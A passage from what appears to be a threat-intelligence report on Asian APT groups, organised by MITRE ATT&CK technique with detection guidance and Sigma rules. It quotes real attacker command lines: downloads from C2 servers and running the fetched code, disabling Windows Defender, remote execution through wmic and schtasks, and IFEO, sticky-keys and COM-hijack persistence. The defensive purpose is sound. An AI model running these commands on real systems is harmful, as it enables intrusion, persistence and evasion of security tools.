1\n\n###### SIGMA rules\n\n\n###### SIGMA rules\n\n   - Sigma-Generic-System Information Discovery via Standard Windows Utilities\n\n   - Sigma-Generic-System Network Configuration Discovery via Standard Windows Utilities\n\n   - Sigma-Generic-Remote System Discovery via Standard Windows Utilities\n\n   - Sigma-Generic-File Download via Bitsadmin\n\n   - Sigma-Generic-Ingress Tool Transfer via curl.exe\n\n   - Sigma-Generic-Compress Data for Exfiltration via Archiver\n\n\n-----\n\n###### Command and Scripting Interpreter: PowerShell T1059.001\n\n\n###### Basic description\n\nAs we all know by now, PowerShell is a powerful tool that provides a command shell and a scripting language\ndeveloped by Microsoft. Though similar to CMD, PowerShell provides more advanced functions and\ncapabilities that make it the preferred choice for system administrators and attackers alike.\n\nFirst, PowerShell is a full-fledged object-oriented language with variables, functions, classes and objects. This\nlanguage enables you to access and manage various system components like files, processes, and registry\nkeys as objects with properties and methods. This lets you implement a more complex logic for scripts.\n\nSecond, PowerShell provides an enormous number of built-in cmdlets, which are small functions that perform\ncertain actions such as file management operations, registry access, system information requests, and\ninteraction with processes and services.\n\nThird, PowerShell was built upon the .NET framework, which provides access to a wide range of libraries and\nAPIs and thereby expands the capabilities of scripts.\n\nFourth, PowerShell supports the use of several alternate names for cmdlets. These are essentially aliases that\ncan be used by threat actors to evade detection.\n\nPowerShell also allows you to remotely manage Windows systems using the WinRM protocol (PowerShell\nRemoting).\n\nLet's examine some examples of using PowerShell by Asian APT groups.\n\n###### Examples of procedures\n\n**Example 1**\n\nDownloading a payload from a C2 server using the cmdlet Invoke-WebRequest:\n\n\nPowerShell iwr -Uri hxxp://8.210.141[.]104:8099/1.txt -OutFile C:\\1.txt -UseBasicParsing\n\n\nThis example uses the alias iwr for the cmdlet Invoke-WebRequest. As we already mentioned, PowerShell lets\nyou work with aliases, and you can even create your own aliases using set-alias. However, this makes it more\ndifficult for analysts to detect attacks.\n\n\n-----\n\n**Example 2**\n\nPowerShell has cmdlets for configuring the settings for scans and updates of Windows Defender. Below is an\nexample of disabling real-time protection and adding a malicious sample to exclusions:\n\n\nPowerShell -exec bypass -command Set-MpPreference -DisableRealtimeMonitoring $True\nPowerShell.exe Add-MpPreference -ExclusionPath \"$user\\$appdata\\aPCyDwLsApDgb.exe\"\n\n\n**Example 3**\n\nHere is another example of downloading a file from a C2 server, but here using the Start-BitsTransfer cmdlet:\n\n\nPowerShell \"Start-BitsTransfer -Source hxxp://security.lomiasecure[.]net/crx/node.txt Destination C:\\\\Users\\\\public\\\\node.txt -transfertype download\"\n\n\n**Example 4**\n\nPowerShell also lets you execute commands or scripts that are encoded in Base64. Attackers often plan\nstage-by-stage execution of their payload using Base64 in PowerShell:\n\n\nPowerShell \"Start-BitsTransfer -Source hxxp://security.lomiasecure[.]net/crx/node.txt Destination C:\\\\Users\\\\public\\\\node.txt -transfertype download\"\n\n\nThe Base64-encoded string is the next PowerShell command.\n\n**Example 5**\n\nAsian APT groups also use PowerShell scripts to automate their activities. Example of running a script from the\nToddyCat group:\n\n\nPowerShell.exe -exec bypass -c 'C:\\programdata\\intel\\mvl.ps1\n\n\nThis script is intended to collect user data.\n\n\n-----\n\n**Example 6**\n\nThe use of the method DownloadFile for downloading a batch script on the system, the further execution and\ndeletion of the script.\n\nPowerShell -Command $wc = New-Object System.Net.WebClient; $tempfile = [System.\nIO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('[REDACTED_URL]', $tempfile); &\n$tempfile ; Remove-Item -Force $tempfile\n\n###### Detection\n\nTo detect malicious activity in PowerShell, you must monitor the Microsoft-Windows-PowerShell/Operational\nlog. Maintaining a PowerShell log can provide information on the execution of scripts or commands, and it can\nhelp when analyzing encoded or obfuscated commands. For example, a Base64 string executed by PowerShell\nwith the -EncodedCommand option will be saved in its decoded form in the log.\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1\n\nMicrosoft-Windows-PowerShell/\nWindows 4103, 4104\nOperational\n\n###### SIGMA rules\n\n   - Sigma-Generic-PowerShell Suspicious Arguments\n\n   - Sigma-Generic-Execution of Downloaded PowerShell Code\n\n   - Sigma-Generic-PowerShell Code Execution from File\n\n   - Sigma-Generic-PowerShell Code Execution from Registry\n\n\n-----\n\n###### Windows Management Instrumentation T1047\n\n\n###### Basic description\n\nWMI (Windows Management Instrumentation) is a Microsoft technology that provides a single interface for\nmanaging components of a local or remote operating system. WMI enables administrators and developers to\nmonitor data on hardware, software, and network resources on a computer system, and effectively manage\nthem. WMI helps automate administrative tasks and control the operation and performance of systems,\nfor example, through system monitoring, software deployment, configuration management, and remote\nadministration.\n\nHowever, these tasks can be performed not only by system administrators, but also by threat actors. They can\nalso obtain intelligence on the system, run malware, move through the network, and control remote systems.\n\n###### Examples of procedures\n\n**Example 1**\n\nOne of the most widespread variants of WMI use is running a process on a remote machine using wmic.exe:\n\n\nwmic /node:<ip> /user:<domain>\\<username> /password:<password> process call create \"cmd /c\nsysteminfo >$temp\\temp.txt\"\n\n\nUse of wmic.exe by the TA428 group:\n\n\nwmic /node:\"<ip>\" /password:\"<password>\" /user:\"[domain]\\[user]\" process call create \"$appdata\\\nmicrosoft\\AppV\\Setup\\Install.exe\"\n\n\n-----\n\n**Example 2**\n\nThe Wmiexec module of the popular framework known as Impacket is used by Red Teams as well as by attack\ngroups.\n\nWmiexec uses WMI technology and allows a threat actor to execute commands on a remote system. To\nremotely connect and execute a command, you must use a valid username and password or an NTLM hash.\nWhen using Wmiexec, you do not need to install a service on the remote host like you would need to do when\nusing similar lateral movement methods such as smbexec.py from Impacket.\n\nWmiexec uses DCOM (Distributed Component Object Model) for remote connection to a system. Execution of\nwmiexec.py by an attacker will establish a connection with DCOM/RPC via port 135.\n\nWhen using Wmiexec, the attacker's commands are executed on the target system on behalf of the wmiprvse.\nexe process. Example from one of these attacks:\n\nParent_command_line: “С:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -embedding”\nCommand_line: “cmd.exe /Q /c whoami 1> \\\\127.0.0.1\\C$\\Windows\\Temp\\MqWrJY 2>&1”\n\nDuring execution of Wmiexec, by default, the command is redirected to a file created in the ADMIN$ folder on\nthe remote host. The shared resource ADMIN$ coincides with the file path C:\\Windows\\, C$, and consequently\nC:\\.\n\n**Example 3**\n\nLet's look at another example of WMI execution on a remote system. In this example, a batch file is run from the\nwmiprvse.exe process:\n\nParent_image_path: “c:\\windows\\system32\\wbem\\wmiprvse.exe”\nCommand_line: “cmd /c $windir\\web\\lc.bat”\n\n\n-----\n\nPart of the file c:\\windows\\web\\lc.bat (MD5: 78E8B01C74DA6E0B8A10281C3B13D5B6):\n\nFigure 41 File fragment\n\nOne more example:\n\n\nParent_image_path: “С:\\Windows\\system32\\wbem\\wmiprvse.exe”\nCommand_line: “cmd /c C:\\programdata\\saL_L.bat C:\\programdata\\fdeploy.dll”\n\n\nIn this example, a library passed to the batch file is installed as a ServiceDLL to be executed in the context of\nsvchost.exe.\n\n###### Detection\n\nThis technique can be detected by tracking WMI activity.\n\n###### 1\n\nTry to detect any process tree anomalies involving wmiprvse.exe. Processes such as cmd.exe or PowerShell.\nexe executed as child processes of wmiprvse.exe are suspicious, but they also may be legitimate. Any\ncorrelation based on unusual child processes of wmiprvse.exe must be clarified using additional data. It\nmight be necessary to profile the child processes of wmiprvse.exe for each organization because system\nadministrators may use and deploy their own WMI scripts on workstations.\n\n###### 2\n\nTo detect the Wmiexec module from the Impacket framework, you can look for its typical patterns, such as\nredirection of output to a file in the command line of a wmiprvse.exe child process.\n\n\n-----\n\nFigure 42 Output redirection\n\n###### 3\n\nTracking use of the wmic.exe tool to execute commands on remote hosts with the keyword /node:\n\n**wmic /node:<ip> /user:<domain>\\<username> /password:<password> process call create \"<command>\"**\n\n###### 4\n\nTracking dicovery commands executed using the wmic.exe tool:\n\nwmic product get name\nwmic os caption\nwmic process | find <security_product_process>\n\n\n-----\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1\n\n###### SIGMA rules\n\n   - Sigma-Generic-Suspicious Command wmic.exe\n\n   - Sigma-Generic-Suspicious Child Process Wmiprvse.exe\n\n   - Sigma-Generic-System Service Discovery via wmic\n\n   - Sigma-Generic-Permission Local Groups Discovery via wmic\n\n   - Sigma-Generic-Security Software Discovery via wmic\n\n\n-----\n\n###### Native API T1106\n\n\n###### Basic description\n\nIn addition to the Win32 API, Windows lets developers use another interface called Native API. The functions\nof the Native API implemented in ntdll.dll often begin with the Nt prefix (for example, NtCreateProcess). The link\nbetween APIs of the Windows subsystem (Win32 API) is illustrated in the figure below.\n\nAlmost all DLL function calls of Windows subsystems (for example, kernel32.dll, advapi32.dll, user32.dll, and\nrpcrt4.dll, etc) are sent to the ntdll.dll, which passes them to ntoskrnl.exe.\n\nINT\nWindows Subsystem DLLs (User mode) NTDLL.dll (User mode) Ntoskrnl.exe (Kernel mode)\n\nThe ntdll.dll module is an operating system component that contains the external part of the Native API for\nuser mode. The Native API implementation resides in ntoskrnl.exe. Via system call, execution is transferred from\nuser mode to kernel mode, and the call is then handled in the kernel.\n\nThe Native API is very attractive to an attacker because it is the lowest level where code is still executed in\nuser mode. This means that Native API functions often provide a wider range of functionality than Win32 API\nfunctions. Another factor is the lack of documentation on many interface functions, which complicates the\ndevelopment of detection logic for tracking malicious actions.\n\n###### Examples of procedures\n\nThe Native API is often used by threat actors in malware.\n\nOne of its most frequently used functions is NtQuerySystemInformation. It lets you obtain a large amount of\nsystem information, ranging from the number of processors to the handles of existing objects.\n\nThe Native API is also used whenever the Windows API does not provide the necessary functionality, like when\nsuspending a process. The NtSuspendProcess function from the Native API provides this capability. Its only\naccepted argument is the handle to the process that should be suspended. The NtResumeProcess function is\nused to resume execution.\n\n###### Detection\n\nNative API techniques can be detected by security solutions such as EPP and Sandbox. These types of\nsolutions let you track the behavior of objects at a low level, and therefore allow you to identify malicious use\nof the Native API.\n\n\n-----\n\n##### Persistence TA0003\n\n###### Event Triggered Execution T1546\n\n Basic description\n\nAPT actors employ various methods to maintain access to a compromised system. One of these methods is\ncalled the Event Triggered Execution T1546 technique. This technique is used to describe scenarios in which\nattackers use various system mechanisms that initiate startup of applications when certain events occur.\nAttackers may abuse these mechanisms to obtain persistence in the victim's system. After gaining access to a\nsystem, attackers can create or modify event triggers to specify which malicious code should be run each time\na specific event occurs. Attackers also use this technique to elevate their privileges because code execution\ncan run under an account with higher privileges such as a LocalSystem account or service account.\n\n\n-----\n\n8\n\n\nEvent Subscription T1546.003\n\n###### Event Triggered Execution: Windows Management Instrumentation Event Subscription T1546.003\n\n Basic description\n\nWindows Management Instrumentation (WMI) Event Subscription is a popular technique for persistent\nentrenchment on a host. Threat actors can utilize WMI capabilities to create a subscription to an event and\nexecute arbitrary code when this event occurs, thereby maintaining persistence in the system.\n\nTo create a WMI subscription to events, the following classes must be registered:\n\n   - The Event Filter class (__EventFilter) is the WMI class that describes which WMI events are delivered to the\nconsumer of events (__EventConsumer). An Event Filter also describes the conditions in which WMI delivers\nevents using the WMI Query Language (WQL ).\n\n   - The Event Consumer class (__EventConsumer) is the WMI class that determines which actions must be\ntaken when an event is received.\n\n   - The Binding class (__FilterToConsumerBinding) is the WMI class used for establishing a connection between\na filter and a consumer.\n\n###### Examples of procedures\n\nIn one of the incidents that we examined earlier, the GDrive-3k backdoor was run by the wmiprvse.exe process.\nAttackers created the following classes for persistence and execution of their malicious code:\n\ninstance of __EventFilter\n{\nEventNamespace = \"root\\\\cimv2\";\nName = \"Chrome Update\";\nQuery = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA\n'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND\nTargetInstance.SystemUpTime < 325\";\nQueryLanguage = \"WQL\";\n};\ninstance of CommandLineEventConsumer\n{\nExecutablePath = \"C:\\\\Windows\\\\System32\\\\GoogleUpdate.exe\";\nName = \"GoogleUpdater\";\n};\n\n\nWQL\n\n\n[Learn more](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi)\n\n\n-----\n\nEvent Subscription T1546.003\n\n###### Detection\n\nTo detect this technique, you must track the creation of WMI subscriptions. For example, the\nSysmon monitoring agent can be configured to log WmiEventFilter, WmiEventConsumer, and\nWmiEventConsumerToFilter activity and use this to detect malicious WMI activity.\n\n###### EventID Event name\n\n19 WmiEventFilter activity detected\n\n20 WmiEventConsumer activity detected\n\n21 WmiEventConsumerToFilter activity detected\n\nA WmiEvent provides complete information on WMI activity that can be used to determine whether this\nactivity is malicious. An event with EventID 19 lets you recognize a trigger event. EventID 20 indicates the\nprogram that should be executed, and an event with EventID 21 shows the connection between the events.\n\nAdditional detection capabilities can be based on command-line options for a process creation event, such as\nPowerShell or wmic.exe cmdlets used to create a WMI subscription, or based on the creation of a file with the\nMOF extension.\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nMicrosoft-Windows-PowerShell/\nWindows 4103, 4104\nOperational\n\nMicrosoft-Windows-WMI-Activity/\nWindows 5860, 5861\nOperational\n\nSysmon Sysmon 1, 11, 19, 20, 21\n\n###### SIGMA rules\n\n- Sigma-Generic-Changing MOF Self-Install Directory via Registry\n\n- Sigma-Generic-MOF file changing/creation\n\n\n-----\n\n###### Event Triggered Execution: Image File Execution Options Injection T1546.012\n\n\n###### Basic description\n\nImage File Execution Options (IFEO) is a Windows registry key that is used by developers to connect a\ndebugging tool to an application. When the application process is started, the debugger specified in the IFEO\nregistry key for the application is added to the beginning of the command-line path of the executable file,\nthereby running the application in the debugger. This Windows function is used by developers and attackers\nalike. The IFEO key enables attackers to persistently obtain persistence in the system because they can\nspecify any executable file as the debugger.\n\nIFEO is located in the following Windows registry tree:\n\n\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\\nnotepad.exe\" /v Debugger /d \"cmd.exe\"\n\n\nAfter adding this registry key, cmd.exe will be automatically created whenever Notepad.exe is started. Local\nadministrator rights are required to employ this technique.\n\nIn addition to establishing persistence in the system, attackers also employ this technique for privilege\nelevation because their malicious executable file will be loaded into a running process and will be executed in its\ncontext.\n\nIFEO also lets you run an arbitrary program whenever a specific program is automatically terminated. To do so,\nadd the following registry key values:\n\n\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\\nnotepad.exe\" /v GlobalFlag /t REG_DWORD /d 512\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v\nReportingMode /t REG_DWORD /d 1\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v\nMonitorProcess /d \"С:\\Windows\\system32\\cmd.exe\"\n\n\n-----\n\n###### Examples of procedures\n\nOne of the examples of this technique being used by Asian APT groups overlaps with the technique known as\nEvent Triggered Execution: Accessibility Features T1546.008.\n\nIn this example, attackers used IFEO to install a backdoor that could be started from the Windows lock screen.\nSome programs from the Ease of Access category, specifically Sticky Keys (sethc.exe), can be started directly\nfrom the lock screen by pressing the Shift key five times, while the Utility Manager (utilman.exe) is started using\nthe hotkey Windows+U.\n\nThe attackers created a Debugger key for the Sticky Keys program (sethc.exe):\n\n\nRegistry_key: “HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image\nFile Execution Options\\sethc.exe”\nRegistry_value_name: “debugger”\nRegistry_value: “С:\\Windows\\system32\\cmd.exe”\n\n\nAs a result, pressing the Shift key five times opens a command line with administrator privileges, and the\nattackers can take control of the system.\n\n###### Detection\n\nTo detect this technique, you must track changes made to the Windows registry, specifically changes to the\nfollowing registry trees:\n\n\n“HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\”\n“HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit”\n\n\nIt is also helpful to track attempts to change these registry trees from the command line:\n\n\n**reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\**\nnotepad.exe\" /v Debugger /d \"cmd.exe\"\n**reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\**\nnotepad.exe\" /v GlobalFlag /t REG_DWORD /d 512\n**reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\"**\n**/v ReportingMode /t REG_DWORD /d 1**\n**reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\"**\n/v MonitorProcess /d \"С:\\Windows\\system32\\cmd.exe\"\n**reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\"**\n**/v MonitorProcess /d \"С:\\Windows\\system32\\cmd.exe\"**\n\n\n-----\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1\n\nSysmon Sysmon 13\n\n###### SIGMA rules\n\n   - Sigma-Generic-Persistence by Image File Execution Options via Registry\n\n   - Sigma-Generic-Accessibility Features Backdoor Installation via ifeo debugger\n\n   - Sigma-Generic-Silent Process Exit Monitoring persistence via PowerShell\n\n   - Sigma-Generic-Application Verifier Persistence via PowerShell\n\n   - Sigma-Generic-Image File Execution Options Injection via SilentProcessExit\n\n   - Sigma-Generic-Accessibility Features Backdoor Installation via SilentProcessExit Monitoring\n\n\n-----\n\n###### Event Triggered Execution: Component Object Model Hijacking T1546.015\n\n\n###### Basic description\n\nThis technique lets threat actors execute arbitrary code in the context of a legitimate process. COM Hijacking\nmost often involves replacing a legitimate COM server DLL with a malicious DLL. The links between them are\nstored in the registry. COM is a component object model that enables software components to communicate\nand interact with each other.\n\nFor COM Hijacking, attackers use the following registry keys depending on the particular deployment scenario:\n\n- HKCU\\Software\\Classes\\CLSID\\<com_object_id>\\InprocServer\n\n- HKCU\\Software\\Classes\\CLSID\\<com_object_id>\\InprocServer32\n\n- HKCU\\Software\\Classes\\CLSID\\<com_object_id>\\LocalServer\n\n- HKCU\\Software\\Classes\\CLSID\\<com_object_id>\\LocalServer32\n\n- HKCU\\Software\\Classes\\CLSID\\<com_object_id>\\TreatAs\n\n- HKCU\\Software\\Classes\\CLSID\\<com_object_id>\\ProgID\n\nTo maintain persistence without being detected, attackers go after the COM objects that are most frequently\nused by processes but will not severely disrupt system functionality when the DLL is replaced.\n\n###### Examples of procedures\n\nWe encountered COM Hijacking in one of the incidents examined above. A process that was run with the\nfollowing command line added a registry key corresponding to a COM object {ECD4FC4D-521C-11D0-B79200A0C90312E1}.\n\n\nCommand_line: С:\\Windows\\system32\\i.exe С:\\Windows\\system32\\2.bin\n\n\nThe sample i.exe (MD5: 0024ee86702ee9234771731975e9ee47) accepts the path of a COM DLL (MD5:\n123FD2B1D1C1A03227B0E75572082436) as an argument and registers it in the registry:\n\n\nRegistry_key: $hkcu\\software\\classes\\clsid\\{ecd4fc4d-521c-11d0-b792-00a0c90312e1}\\inprocserver32\nRegistry_value: $appdata\\brmsl.exe.mui\n\n\n-----\n\nFigure 43 COM Hijacking Technique\n\nAfter the DLL was added to the registry, the process ran it using rundll32.exe:\n\nrundll32.exe $appdata\\brmsl.exe.mui StartNow\n\n\n-----\n\nFor COM Hijacking purposes, the attackers chose the COM object {ECD4FC4D-521C-11D0-B792-\n00A0C90312E1} (Shell Rebar BandSite) corresponding to C:\\Windows\\system32\\explorerframe.dll. This COM\nobject is used very often:\n\nFigure 44 Events of loading explorerframe.dll module into the processes\n\n###### Detection\n\nTo detect the COM Hijacking technique, you can track events involving unsigned DLLs being loaded into\ntrusted processes (for example, into explorer.exe). You can also correlate changes made to registry values\ncontaining paths to COM objects with the loading of these COM objects into trusted processes or with the\nstart of COM servers as individual processes/services.\n\nValues storing the path to COM components:\n\n   - HKCU\\Software\\Classes\\CLSID\\<com_object_id>\\InprocServer\n\n   - HKCU\\Software\\Classes\\CLSID\\<com_object_id>\\InprocServer32\n\n   - HKCU\\Software\\Classes\\CLSID\\<com_object_id>\\LocalServer\n\n   - HKCU\\Software\\Classes\\CLSID\\<com_object_id>\\LocalServer32\n\n   - HKCU\\Software\\Classes\\CLSID\\<com_object_id>\\TreatAs\n\n   - HKCU\\Software\\Classes\\CLSID\\<com_object_id>\\ProgID\n\n\n-----\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1, 7, 13\n\nMicrosoft-Windows-PowerShell/\nWindows 4103, 4104\nOperational\n\n###### SIGMA rules\n\n   - Sigma-Generic-COM Hijacking via Sdclt\n\n   - Sigma-Generic-COM Hijacking via mscfile\n\n   - Sigma-Generic-COM Hijacking via DelegateExecute\n\n   - Sigma-Generic-Discovery COM Keys via PowerShell\n\n   - Sigma-Generic-COM Hijacking via PowerShell\n\n   - Sigma-Generic-COM Hijacking via TreatAs\n\n\n-----\n\n###### BITS Jobs T1197\n\n\n###### Basic description\n\nIn the technique known as BITS (Background Intelligent Transfer Service) Jobs T1197, attackers use BITS to load\nand execute malicious code on a target system. BITS is a service that is built into a Windows operating system.\nThis technique closely overlaps with the technique known as Ingress Tool Transfer T1105 because it describes\none of the ways to load malicious software from an external network.\n\nBITS is a service that transfers files between computers over the internet or local area network using\nthe available bandwidth of the network. Hackers use it to conceal their activity from the security system\nand firewalls because the BITS service works in the background and can forward data over encrypted\ncommunication channels. BITS is also used by many applications and services in Windows to update the\nsystem, download files, install programs, and perform other file transfer operations. It provides a convenient\nmechanism for efficient and reliable transfer of files in background mode, thereby minimizing the impact on\nsystem performance and network access.\n\n###### Examples of procedures\n\nIncident in Indonesia:\n\n\ncmd.exe\" /c bitsadmin /transfer n hxxp[:]//8.210.141[.]104[:]8099/1.txt $public\\Downloads\\1.txt\"\n\n\nIncident in Pakistan:\n\n\n“$system32\\cmd.exe” /c bitsadmin /transfer n\nhxxps[:]//raw/githubusercontent[.]com/tellyou123/1/master/aro.dat $temp\\aro.dat >\nC:\\inetpub\\wwwroot\\aspnet_client\\1.txt\n\n\nAs you can see, in both examples the attackers use similar command lines with the /transfer option. Here the\nattackers download one or more files to the specified directories. This is usually necessary for delivery of\nmalicious code for attack progression.\n\n\n-----\n\n###### Detection\n\nThe main way to detect the BITS Jobs T1197 technique is to look for process creation events that you can use\nto detect suspicious command-line options such as \"download\", \"copy\", and \"transfer\". In EDR solutions and in\nstandard Windows logs, process creation events can be found by looking for Event ID 4688, for example, or\nEventID 1 of the Sysmon agent.\n\nTo detect this technique, you must pay attention to the relationship between a parent process and child\nprocess. If the bitsadmin process is created by something other than cmd.exe, this could indicate an anomaly.\nHere's an example of this behavior:\n\n\nImage_path: \"$windir\\$system32\\bitsadmin.exe\",\nParent_image_path: \"$windir\\$system32\\wscript.exe\",\nCommand_line: \"$windir\\$system32\\bitsadmin.exe /transfer 8 <URL>l $user\\$appdata\\random.exe\"\n\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1\n\n###### SIGMA rules\n\n- Sigma-Generic-File Download via Bitsadmin\n\n- Sigma-Generic-Not Standard Parent Process Bitsadmin\n\n\n-----\n\n###### Valid Accounts T1078\n\n Basic description\n\nAttackers exploit existing domain user accounts whose credentials they were able to obtain during the\nCredential Access stage by acquiring them on the darkweb or getting them by other means. User accounts\ncan also be used to gain initial access, establish persistence in the system, elevate privileges, move laterally\nthrough the network, and impede security efforts.\n\nStrict access restrictions help mitigate the damage that can be caused by compromised user accounts.\nMicrosoft suggests an approach to managing privileged account credentials based on Zero Trust principles,\nwhich include the \"Use least privilege access\" and \"Assume breach\" principles.\n\n\n-----\n\n###### Valid Accounts: Domain Accounts T1078.002\n\n\n###### Basic description\n\nAttackers use domain accounts to accomplish their objectives. The most frequently used implementation of\nthis technique is to use a domain administrator account that allows attackers to move laterally through the\nnetwork. Use of a compromised account is accompanied by other actions related to the Account Manipulation\nT1098 technique, such as changing the password and/or adding the account to groups (for example, to the\nRemote Desktop Users group).\n\n###### Examples of procedures\n\nIn one of its attacks, an Asian APT group used the accounts of a domain user and administrator for lateral\nmovement through the network and to run applications. Other user accounts in the domain were also\ncompromised.\n\nAs part of another campaign, the attackers used a domain administrator account whose password they reset.\nIn another attack, an Asian APT group used legitimate domain account credentials to remotely connect to\nhosts.\n\n###### Detection\n\nTo detect this technique, you can focus on any anomalies found in telemetry and events related to specially\ncreated bait accounts (honeypots).\n\n\n-----\n\n###### Scheduled Task/Job T1053\n\n Basic description\n\nScheduled tasks are an operating system function that lets users schedule the execution of programs or\nscripts at a specific time or at specific time intervals. The scheduled tasks function is available in all operating\nsystems, and these tasks are used by system administrators and various legitimate applications. Therefore,\nattackers like to set these scheduled tasks to help establish persistence in the system.\n\nWith the Task Scheduler, malicious programs are able to run each time the system starts or at a specific time\naccording to a schedule. In addition, scheduled tasks can be created in the context of a specific user account,\nfor example the one with elevated privileges, therefore this technique is part of the MITRE ATT&CK Privilege\nEscalation tactic.\n\n\n-----\n\n###### Scheduled Task/Job: Scheduled Task T1053.005\n\n Basic description\n\nLet's examine the sub-technique known as Scheduled Task T1053.005 pertaining to Windows scheduled tasks.\n\nScheduled tasks provide a convenient way to automate routine or temporary tasks, such as system\nmaintenance, backups, startup of applications, or data synchronization.\n\nPlease keep in mind that scheduled tasks are usually linked to the user context in which they were created. For\nsystem-level tasks or tasks requiring elevated privileges, administrators may be required to configure a startup\ntask with appropriate permissions or use service accounts.\n\nAlthough scheduled tasks are primarily intended for legitimate purposes, hackers can use them for malicious\nactivity such as the following:\n\n   - Malware execution. Hackers can create a scheduled task that initiates execution of malicious code in\nthe system. This can be done by scheduling a startup task for a specific time or in response to specific\nconditions.\n\n   - Persistence in the system. By creating a scheduled task that runs when the system starts or runs at specific\ntime intervals, attackers can guarantee that their malicious code remains active and go undetected for a\nlong period of time.\n\n   - Data exfiltration. Attackers can schedule tasks that run periodically to collect and exfiltrate sensitive data\nfrom a compromised system.\n\n   - Privilege elevation. Scheduled tasks can be used to elevate privileges in a compromised system. By creating\na scheduled task with higher privileges, for example, to start a task with system-level privileges, attackers\ncan expand their control over the system.\n\nA scheduled task can be created using the Task Scheduler tool provided by Windows:\n\nschtasks /create /tn «<task_name>» /tr «<path_to_executable>» /sc <schedule_type> /st <start_time>\n\n\n-----\n\n###### Examples of procedures\n\n**Example 1**\n\nThe HolyGhost ransomware spread by the APT group known as Dark Seoul also created a task using\nschtasks.exe:\n\n\nschtasks /create /tn lockertask /tr С:\\Windows\\btlc.exe /sc minute /mo 1 /F /ru system\n\n\n**Example 2**\n\nIn one of the incidents involving the ShadowPad backdoor, an operator of the APT group Winnti added a\nsystem file attribute to malware before creating a scheduled task to run this malware:\n\n\nattrib +s crml.exe\nschtasks /Create /Tn \\Microsoft\\Windows\\Registration\\CRMLog /sc daily /st 11:50 /tr\n\"С:\\Windows\\Registration\\crml.exe\" /ru system /f\nschtasks /run /Tn \\Microsoft\\Windows\\Registration\\CRMLog\n\n\n**Example 3**\n\nThe schtasks tool can be used to create tasks on a remote host. For example, this was done by the ToddyCat\ngroup:\n\n\nschtasks /s <remote_host> /tn one /u <domain>\\<username> /p <password> /create /ru system /sc\nDAILY /tr \"cmd /c start /b PowerShell.exe -exec bypass -c 'C:\\programdata\\intel\\mvl.ps1 20'\" /f\nschtasks /s <remote_host> /tn one /u <domain>\\<username> /p <password> /i /run\n\n\n**Example 4**\n\nIn another attack, instead of specifying an executable file to start, the attackers used an XML file consisting of\na job in XML format:\n\n\n\"$windir\\$system32\\schtasks.exe\" /Create /TN \"Updates\\aPCyDwLsApDgb\" /XML\n\"$user\\$temp\\tmp8ACB.tmp\"\n\n\n-----\n\n###### Detection\n\nTo detect the creation of scheduled tasks in the system, you can use Windows log events such as EventID\n4698 (creation of a scheduled task) and EventID 4702 (update of a scheduled task).\n\nYou must also track the startup of processes related to the creation of scheduled tasks, such as schtasks.exe\nor the PowerShell cmdlet New-ScheduledTask.\n\nYou should pay attention to the following task creation parameters:\n\n   - Running an executable file from shared folders.\n\n   - Creating a task in the context of another user: malicious tasks often have a parameter for running at the\nsystem level to elevate their privileges.\n\n   - Run frequency: many APT groups configure a task to run every minute.\n\n   - Creating a task on a remote host: this method is used for lateral movement.\n\n###### Event source Log Event ID\n\nWindows Security 4688, 4698, 4702\n\nSysmon Sysmon 1\n\nWindows TaskScheduler 106, 200, 201\n\n###### SIGMA rules\n\n   - Sigma-Generic-Windows Shell Started Schtasks\n\n   - Sigma-Generic-Suspicious Schtasks.exe Arguments\n\n   - Sigma-Generic-Scheduled Task Start from Public Directory\n\n\n-----\n\n###### Server Software Component T1505\n\n Basic description\n\nThis technique involves the operation of various components and services working on a server, such as web\nservices, application services, databases, mail services, and much more. Threat actors often target these\ncomponents to exploit vulnerabilities or misconfigurations and thereby gain unauthorized access, entrench\nthemselves in the system, or execute malicious code on the target system.\n\n\n-----\n\n###### Server Software Component: Web Shell T1505.003\n\n\n###### Basic description\n\nAsian APT groups exploit popular vulnerabilities of web servers. After gaining access, attackers can install\na backdoor on a web server and/or a Web Shell to establish persistence in the system. A Web Shell is a\ncommand shell used for remote management of a web server.\n\n###### Examples of procedures\n\n**Example 1**\n\nIn an incident using ShadowPad in Pakistan, the attackers set up a Web Shell. Malicious DLLs were found on a\nmail server.\n\nFigure 45 Malicious DDL code\n\n\n\"cmd\" /c cd /d \"C:/inetpub/wwwroot/aspnet_client\" & whoami & echo [S] & cd & echo [E]\"\n\n\n-----\n\n**Example 2**\n\nIn one of the GERT investigations related to an Asian group, experts found out that the attackers exploited\nthe vulnerability known as CVE-2021-26855 ProxyLogon. After gaining access to an MS Exchange server, the\nattackers set up a Web 